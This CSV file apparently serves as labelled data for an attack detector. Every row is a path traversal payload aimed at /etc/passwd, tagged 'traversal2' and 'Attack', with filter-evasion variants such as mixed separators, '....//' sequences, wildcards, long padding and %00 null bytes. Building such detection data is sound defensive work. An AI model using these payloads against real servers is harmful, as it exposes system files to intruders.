Content,Category,Label
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd,traversal2,Attack
....//....//....//....//....//....//....//....//....//....//....//etc/passwd,traversal2,Attack
....//....//....//....//....//....//....//....//....//....//etc/passwd,traversal2,Attack
....//....//....//....//....//....//....//....//....//etc/passwd,traversal2,Attack
....//....//....//....//....//....//....//....//etc/passwd,traversal2,Attack
....//....//....//....//....//....//....//etc/passwd,traversal2,Attack
....//....//....//....//....//....//etc//passwd,traversal2,Attack
....//....//....//....//....//....//etc/passwd,traversal2,Attack
....//....//....//....//....//etc//passwd,traversal2,Attack
....//....//....//....//....//etc/passwd,traversal2,Attack
....//....//....//....//etc//passwd,traversal2,Attack
....//....//....//....//etc/passwd,traversal2,Attack
....//....//....//etc//passwd,traversal2,Attack
....//....//....//etc/passwd,traversal2,Attack
....//....//etc//passwd,traversal2,Attack
....//....//etc/passwd,traversal2,Attack
....//etc//passwd,traversal2,Attack
....//etc/passwd,traversal2,Attack
..../\..../\..../\..../\..../\..../\etc/\passwd,traversal2,Attack
..../\..../\..../\..../\..../\..../\etc\passwd,traversal2,Attack
..../\..../\..../\..../\..../\etc/\passwd,traversal2,Attack
..../\..../\..../\..../\..../\etc\passwd,traversal2,Attack
..../\..../\..../\..../\etc/\passwd,traversal2,Attack
..../\..../\..../\..../\etc\passwd,traversal2,Attack
..../\..../\..../\etc/\passwd,traversal2,Attack
..../\..../\..../\etc\passwd,traversal2,Attack
..../\..../\etc/\passwd,traversal2,Attack
..../\..../\etc\passwd,traversal2,Attack
..../\etc/\passwd,traversal2,Attack
..../\etc\passwd,traversal2,Attack
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/....\/etc/passwd,traversal2,Attack
....\/....\/etc/passwd,traversal2,Attack
....\/etc/passwd,traversal2,Attack
.../.../.../.../.../.../etc/passwd,traversal2,Attack
.../.../.../.../.../etc/passwd,traversal2,Attack
.../.../.../.../etc/passwd,traversal2,Attack
.../.../.../etc/passwd,traversal2,Attack
.../.../etc/passwd,traversal2,Attack
..././..././..././..././..././..././etc/passwd,traversal2,Attack
..././..././..././..././..././etc/passwd,traversal2,Attack
..././..././..././..././etc/passwd,traversal2,Attack
..././..././..././etc/passwd,traversal2,Attack
..././..././etc/passwd,traversal2,Attack
..././etc/passwd,traversal2,Attack
.../.\.../.\.../.\.../.\.../.\.../.\etc\passwd,traversal2,Attack
.../.\.../.\.../.\.../.\.../.\etc\passwd,traversal2,Attack
.../.\.../.\.../.\.../.\etc\passwd,traversal2,Attack
.../.\.../.\.../.\etc\passwd,traversal2,Attack
.../.\.../.\etc\passwd,traversal2,Attack
.../.\etc\passwd,traversal2,Attack
.../etc/passwd,traversal2,Attack
...\...\...\...\...\...\etc\passwd,traversal2,Attack
...\...\...\...\...\etc\passwd,traversal2,Attack
...\...\...\...\etc\passwd,traversal2,Attack
...\...\...\etc\passwd,traversal2,Attack
...\...\etc\passwd,traversal2,Attack
...\etc\passwd,traversal2,Attack
../../../../../../../../../../../etc/passwd,traversal2,Attack
../../../../../../../../../../etc/passwd,traversal2,Attack
../../../../../../../../../etc/passwd,traversal2,Attack
../../../../../../../../etc/passwd,traversal2,Attack
../../../../../../../etc/passwd,traversal2,Attack
../../../../../../etc/passwd,traversal2,Attack
../../../../../etc/passwd,traversal2,Attack
../../../../etc/passwd,traversal2,Attack
../../..//../../etc/passwd,traversal2,Attack
../../../etc/passwd,traversal2,Attack
../../etc/passwd,traversal2,Attack
..//..//..//..//..//..//etc//passwd,traversal2,Attack
..//..//..//..//..//etc//passwd,traversal2,Attack
..//..//..//..//etc//passwd,traversal2,Attack
..//..//..//etc//passwd,traversal2,Attack
..//..//etc//passwd,traversal2,Attack
..///..///..///..///..///..///etc///passwd,traversal2,Attack
..///..///..///..///..///etc///passwd,traversal2,Attack
..///..///..///..///etc///passwd,traversal2,Attack
..///..///..///etc///passwd,traversal2,Attack
..///..///etc///passwd,traversal2,Attack
..///etc///passwd,traversal2,Attack
..//etc//passwd,traversal2,Attack
../\../\../\../\../\../\etc/\passwd,traversal2,Attack
../\../\../\../\../\etc/\passwd,traversal2,Attack
../\../\../\../\etc/\passwd,traversal2,Attack
../\../\../\etc/\passwd,traversal2,Attack
../\../\etc/\passwd,traversal2,Attack
../\/../\/../\/../\/../\/../\/etc/\/passwd,traversal2,Attack
../\/../\/../\/../\/../\/etc/\/passwd,traversal2,Attack
../\/../\/../\/../\/etc/\/passwd,traversal2,Attack
../\/../\/../\/etc/\/passwd,traversal2,Attack
../\/../\/etc/\/passwd,traversal2,Attack
../\/etc/\/passwd,traversal2,Attack
../\etc/\passwd,traversal2,Attack
../etc/passwd,traversal2,Attack
..\..\..\..\..\..\..\..\..\..\etc\passwd,traversal2,Attack
..\..\..\..\..\..\etc\passwd,traversal2,Attack
..\..\..\..\..\etc\passwd,traversal2,Attack
..\..\..\..\etc\passwd,traversal2,Attack
..\..\..\etc\passwd,traversal2,Attack
..\..\etc\passwd,traversal2,Attack
..\/..\/..\/..\/..\/..\/etc\/passwd,traversal2,Attack
..\/..\/..\/..\/..\/etc\/passwd,traversal2,Attack
..\/..\/..\/..\/etc\/passwd,traversal2,Attack
..\/..\/..\/etc\/passwd,traversal2,Attack
..\/..\/etc\/passwd,traversal2,Attack
..\/\..\/\..\/\..\/\..\/\..\/\etc\/\passwd,traversal2,Attack
..\/\..\/\..\/\..\/\..\/\etc\/\passwd,traversal2,Attack
..\/\..\/\..\/\..\/\etc\/\passwd,traversal2,Attack
..\/\..\/\..\/\etc\/\passwd,traversal2,Attack
..\/\..\/\etc\/\passwd,traversal2,Attack
..\/\etc\/\passwd,traversal2,Attack
..\/etc\/passwd,traversal2,Attack
..\\..\\..\\..\\..\\..\\etc\\passwd,traversal2,Attack
..\\..\\..\\..\\..\\etc\\passwd,traversal2,Attack
..\\..\\..\\..\\etc\\passwd,traversal2,Attack
..\\..\\..\\etc\\passwd,traversal2,Attack
..\\..\\etc\\passwd,traversal2,Attack
..\\\..\\\..\\\..\\\..\\\..\\\etc\\\passwd,traversal2,Attack
..\\\..\\\..\\\..\\\..\\\etc\\\passwd,traversal2,Attack
..\\\..\\\..\\\..\\\etc\\\passwd,traversal2,Attack
..\\\..\\\..\\\etc\\\passwd,traversal2,Attack
..\\\..\\\etc\\\passwd,traversal2,Attack
..\\\etc\\\passwd,traversal2,Attack
..\\etc\\passwd,traversal2,Attack
..\etc\passwd,traversal2,Attack
./.././.././.././.././.././../etc/passwd,traversal2,Attack
./.././.././.././.././../etc/passwd,traversal2,Attack
./.././.././.././../etc/passwd,traversal2,Attack
./.././.././../etc/passwd,traversal2,Attack
./.././../etc/passwd,traversal2,Attack
./../etc/passwd,traversal2,Attack
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../etc/passwd,traversal2,Attack
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././..\etc\passwd,traversal2,Attack
.//..//.//..//.//..//.//..//.//..//.//..//etc//passwd,traversal2,Attack
.//..//.//..//.//..//.//..//.//..//etc//passwd,traversal2,Attack
.//..//.//..//.//..//.//..//etc//passwd,traversal2,Attack
.//..//.//..//.//..//etc//passwd,traversal2,Attack
.//..//.//..//etc//passwd,traversal2,Attack
.//..//etc//passwd,traversal2,Attack
.?/.?/.?/.?/.?/.?/etc/passwd,traversal2,Attack
.?/.?/.?/.?/.?/etc/passwd,traversal2,Attack
.?/.?/.?/.?/etc/passwd,traversal2,Attack
.?/.?/.?/etc/passwd,traversal2,Attack
.?/.?/etc/passwd,traversal2,Attack
.?/etc/passwd,traversal2,Attack
.?\.?\.?\.?\.?\.?\etc\passwd,traversal2,Attack
.?\.?\.?\.?\.?\etc\passwd,traversal2,Attack
.?\.?\.?\.?\etc\passwd,traversal2,Attack
.?\.?\.?\etc\passwd,traversal2,Attack
.?\.?\etc\passwd,traversal2,Attack
.?\etc\passwd,traversal2,Attack
.\..\.\..\.\..\.\..\.\..\.\..\etc\passwd,traversal2,Attack
.\..\.\..\.\..\.\..\.\..\etc\passwd,traversal2,Attack
.\..\.\..\.\..\.\..\etc\passwd,traversal2,Attack
.\..\.\..\.\..\etc\passwd,traversal2,Attack
.\..\.\..\etc\passwd,traversal2,Attack
.\..\etc\passwd,traversal2,Attack
.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\../../../etc\passwd,traversal2,Attack
.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\etc\passwd,traversal2,Attack
.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\etc\\passwd,traversal2,Attack
.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\etc\\passwd,traversal2,Attack
.\\..\\.\\..\\.\\..\\.\\..\\etc\\passwd,traversal2,Attack
.\\..\\.\\..\\.\\..\\etc\\passwd,traversal2,Attack
.\\..\\.\\..\\etc\\passwd,traversal2,Attack
.\\..\\etc\\passwd,traversal2,Attack
.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,traversal2,Attack
/../../../../../../../../../../etc/passwd,traversal2,Attack
/../../../../../../../../../../etc/passwd^^,traversal2,Attack
/..\../..\../..\../..\../..\../..\../etc/passwd,traversal2,Attack
/..\/..\/..\/..\/..\/..\etc\/passwd,traversal2,Attack
/..\/..\/..\/..\/..\etc\/passwd,traversal2,Attack
/..\/..\/..\/..\etc\/passwd,traversal2,Attack
/..\/..\/..\etc\/passwd,traversal2,Attack
/..\/..\etc\/passwd,traversal2,Attack
/..\etc\passwd,traversal2,Attack
/./././././././././././etc/passwd,traversal2,Attack
///../../../../../../etc///passwd,traversal2,Attack
///../../../../../etc///passwd,traversal2,Attack
///../../../../etc///passwd,traversal2,Attack
///../../../etc///passwd,traversal2,Attack
///../../etc///passwd,traversal2,Attack
///../etc///passwd,traversal2,Attack
///..\..\..\..\..\..\etc///passwd,traversal2,Attack
///..\..\..\..\..\etc///passwd,traversal2,Attack
///..\..\..\..\etc///passwd,traversal2,Attack
///..\..\..\etc///passwd,traversal2,Attack
///..\..\etc///passwd,traversal2,Attack
///..\etc///passwd,traversal2,Attack
?./?./?./?./?./?./etc/passwd,traversal2,Attack
?./?./?./?./?./etc/passwd,traversal2,Attack
?./?./?./?./etc/passwd,traversal2,Attack
?./?./?./etc/passwd,traversal2,Attack
?./?./etc/passwd,traversal2,Attack
?./etc/passwd,traversal2,Attack
?.\?.\?.\?.\?.\?.\etc\passwd,traversal2,Attack
?.\?.\?.\?.\?.\etc\passwd,traversal2,Attack
?.\?.\?.\?.\etc\passwd,traversal2,Attack
?.\?.\?.\etc\passwd,traversal2,Attack
?.\?.\etc\passwd,traversal2,Attack
?.\etc\passwd,traversal2,Attack
??/??/??/??/??/??/etc/passwd,traversal2,Attack
??/??/??/??/??/etc/passwd,traversal2,Attack
??/??/??/??/etc/passwd,traversal2,Attack
??/??/??/etc/passwd,traversal2,Attack
??/??/etc/passwd,traversal2,Attack
??/etc/passwd,traversal2,Attack
??\??\??\??\??\??\etc\passwd,traversal2,Attack
??\??\??\??\??\etc\passwd,traversal2,Attack
??\??\??\??\etc\passwd,traversal2,Attack
??\??\??\etc\passwd,traversal2,Attack
??\??\etc\passwd,traversal2,Attack
??\etc\passwd,traversal2,Attack
\../\../\../\../\../\../etc/\passwd,traversal2,Attack
\../\../\../\../\../\../etc/passwd,traversal2,Attack
\../\../\../\../\../etc/\passwd,traversal2,Attack
\../\../\../\../\../etc/passwd,traversal2,Attack
\../\../\../\../etc/\passwd,traversal2,Attack
\../\../\../\../etc/passwd,traversal2,Attack
\../\../\../etc/\passwd,traversal2,Attack
\../\../\../etc/passwd,traversal2,Attack
\../\../etc/\passwd,traversal2,Attack
\../\../etc/passwd,traversal2,Attack
\../etc/passwd,traversal2,Attack
\../etc\passwd,traversal2,Attack
\..\..\..\..\..\..\..\..\..\..\etc\passwd,traversal2,Attack
\..\\..\\..\\..\\..\\..\etc\passwd,traversal2,Attack
\..\\..\\..\\..\\..\etc\passwd,traversal2,Attack
\..\\..\\..\\..\etc\passwd,traversal2,Attack
\..\\..\\..\etc\passwd,traversal2,Attack
\..\\..\etc\passwd,traversal2,Attack
\..\etc\passwd,traversal2,Attack
\\\../../../../../../etc\\\passwd,traversal2,Attack
\\\../../../../../etc\\\passwd,traversal2,Attack
\\\../../../../etc\\\passwd,traversal2,Attack
\\\../../../etc\\\passwd,traversal2,Attack
\\\../../etc\\\passwd,traversal2,Attack
\\\../etc\\\passwd,traversal2,Attack
\\\..\..\..\..\..\..\etc\\\passwd,traversal2,Attack
\\\..\..\..\..\..\etc\\\passwd,traversal2,Attack
\\\..\..\..\..\etc\\\passwd,traversal2,Attack
\\\..\..\..\etc\\\passwd,traversal2,Attack
\\\..\..\etc\\\passwd,traversal2,Attack
\\\..\etc\\\passwd,traversal2,Attack
/../../../../../../../../../../../etc/passwd%00.html,traversal2,Attack
../../../../../../etc/passwd%00index.htm,traversal2,Attack
../../../../../etc/passwd%00index.htm,traversal2,Attack
../../../../etc/passwd%00index.htm,traversal2,Attack
../../../etc/passwd%00index.htm,traversal2,Attack
../../etc/passwd%00index.htm,traversal2,Attack
../etc/passwd%00index.htm,traversal2,Attack
